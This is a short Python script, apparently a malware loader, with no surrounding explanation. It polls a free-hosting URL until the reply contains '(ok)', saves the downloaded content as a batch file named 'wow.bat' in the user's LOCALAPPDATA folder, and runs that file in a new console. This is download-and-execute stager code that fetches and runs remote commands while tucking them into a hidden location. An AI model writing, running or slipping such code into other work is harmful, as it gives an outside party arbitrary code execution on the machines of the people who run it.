import requests
import subprocess
import os

response = ''

while '(ok)' not in str(response):
    response = requests.get("https://jdservernielubieng.000webhostapp.com/ok.txt").content

path = os.path.join(os.getenv("LOCALAPPDATA"), 'wow.bat')

open(path, 'wb').write(response)
subprocess.Popen(path, creationflags=subprocess.CREATE_NEW_CONSOLE)